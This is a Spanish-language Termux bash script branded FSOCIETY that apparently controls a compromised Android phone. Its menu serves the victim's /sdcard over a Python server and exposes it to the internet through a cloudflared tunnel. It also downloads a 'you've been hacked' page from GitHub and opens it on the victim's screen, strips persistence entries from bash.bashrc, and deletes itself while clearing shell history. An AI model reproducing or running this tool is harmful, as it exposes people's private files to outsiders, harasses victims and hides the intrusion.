#!/bin/bash

cyan='\033[1;36m'
amarillo='\033[1;33m'
blanco='\033[1;37m'
verde='\033[1;32m'
lila='\033[1;35m'
rojo='\033[1;31m'
 
R='\e[1;31m' # Rojo fuerte            
G='\e[1;32m' # Verde Fuerte         
Y='\e[1;33m' # Amarillo Fuerte       
B='\e[1;34m' # Azul fuerte          
M='\e[1;35m' # Purpura o algo asi   
C='\e[1;36m' # Cyan color fuerte     
W='\e[1;37m' # Blanco Fuerte       
P='\e[1;35m' # Purpura               
Green='\e[32m' # Verde             
Gr='\e[5m\e[32m' # verde           
Gris='\e[90m' # Gris               

clear

banner() {
echo
echo
echo -e "${amarillo}================================"
echo
echo -e "${blanco}FSOCIETYFSOCIETYFSOCIETYFSOCIETY"
echo
echo -e "${amarillo}================================"
}

descargadatos() {
rm -rf log.txt
echo
echo
echo -e "${verde}Iniciando servidor python${Gris}..."
python -m http.server 8081 > /dev/null 2>&1 &
echo
echo -e "${amarillo}Instalando Cloudflared${Gris}..."
echo
pkg install cloudflared
echo
echo -e "${verde}Iniciando link${Gris}..."
cloudflared tunnel -url 127.0.0.1:8081 --logfile log.txt > /dev/null 2>&1 &
sleep 3
link=$(cat log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
ps
}

matarprocesos() {
banner
echo
echo -e "${amarillo}Procesos:${verde}"
echo
ps
echo -e -n "${cyan}Escribe el numero de los procesos -> ${blanco}"
read numeros
killall -9 $numeros
ps
}

fuistehackeado() {
banner
echo
rm -rf i.png
rm -rf hacked.html
curl https://raw.githubusercontent.com/WhBeatZ/hacked/main/i.png -o ip.png
curl https://raw.githubusercontent.com/WhBeatZ/hacked/main/hacked.html -o hacked.html
echo
echo -e "${amarillo}Iniciar fuiste hackeado en la pantalla de la victima? (Y | N)"
echo
echo -e -n "${cyan}--> ${blanco}"
read caca
case $caca in
		Y | y | yes)
		am start -a android.intent.action.VIEW -d localhost:8081/hacked.html 2>/dev/null
		;;
		
		N | n | no)
		exit
		;;
esac
}

deshackear() {
banner
echo
echo -e "${verde}Deshackeando..."
cd $home
cd ..
rm -rf h.sh
cd usr
rm -rf util.sh
cd /data/data/com.termux/files/usr/etc
sed -e 's/screen/#/g' bash.bashrc > bash.bashrcc
rm -rf bash.bashrc
mv bash.bashrcc bash.bashrc
echo
echo -e "${Amarillo}Deshackeado :D"
}

eliminar() {
rm -rf s.sh
history -c && history -w && history
}

menuprincipal() {
cd /sdcard
echo
echo
echo -e "${amarillo}1${Gris}. ${blanco}Iniciar sevidor de descarga de datos"
echo
echo -e "${amarillo}2${Gris}. ${blanco}Matar procesos"
echo
echo -e "${amarillo}3${Gris}. ${blanco}Iniciar Fuiste Hackeado Victima"
echo
echo -e "${amarillo}4${Gris}. ${blanco}Deshackear"
echo
echo -e "${amarillo}5${Gris}. ${blanco}Eliminar herramienta"
echo
echo -e -n "${amarillo}--> ${blanco}"
read opcion
case $opcion in
             1 | 1.)
             descargadatos
             ;;
             2| 2.)
             matarprocesos
             ;;
             3 | 3.)
             fuistehackeado
             ;;
             4 | 4.)
             deshackear
             ;;
             5 | 5.)
             eliminar
esac
}

banner
menuprincipal
